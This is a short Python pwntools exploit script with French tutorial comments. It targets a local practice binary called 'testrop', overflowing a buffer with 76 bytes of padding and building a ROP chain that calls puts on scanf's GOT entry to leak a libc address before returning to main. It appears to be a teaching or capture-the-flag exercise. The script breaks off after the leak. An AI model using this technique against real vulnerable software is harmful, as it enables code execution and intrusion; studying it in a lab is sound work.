#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *


context(arch='i386')
p = 0
b = ELF('./testrop')
libc = ELF('/lib32/libc.so.6') # "info sharedlibrary" sous gdb pour connaître le chemin de votre libc

DEBUG = False

def wait(until):
    buf=p.recvuntil(until)
    if(DEBUG):
        print (buf)
    return buf

def start():
    global p, libc, b
    if p != 0:
        p.close()
    p = process('./testrop')
    wait("Input:")


# pwntools permet de récupérer les adresses directement dans le binaire sans avoir à les chercher via objdump :
addrmain = b.symbols['main'] # 0x8048477
pr = 0x0804901e  #: pop ebx ; ret
gotscanf = b.symbols['got.__isoc99_scanf'] # 0x804975c
pltputs = b.symbols['puts'] # 0x8048310 
padding=b"a"*76

start()
log.info("Construct ropchain")
ropchain=padding+p32(pltputs)+p32(pr)+p32(gotscanf)+p32(addrmain) # p32 permet de "pack" une adresse : 0x61616161 -> "aaaa" 
leak=wait('Input:')

log.info("Get scanf leak")
p.sendline(ropchain)
print (wait('Input:'))